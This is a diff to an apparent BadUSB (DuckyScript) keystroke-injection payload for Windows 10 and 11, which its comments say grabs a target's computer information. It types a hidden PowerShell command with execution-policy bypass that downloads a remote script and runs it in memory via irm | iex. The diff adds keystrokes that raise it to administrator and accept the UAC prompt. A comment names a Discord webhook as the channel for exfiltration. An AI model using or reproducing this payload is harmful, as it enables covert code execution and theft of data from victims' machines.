@@ -7,9 +7,11 @@ REM	Description: This payload will grab alot of the targets computer information
 REM	Target: Windows 10, 11
 
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell -Nop -Noni -w h -ep bypass $dc='';$pers='True';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex
-ENTER
+CTRL-SHIFT ENTER
+DELAY 4000
+ALT y
 
 REM     Fill in the variable to set your exfil method.
 REM     $dc is the variable that holds your Discord webhook.  
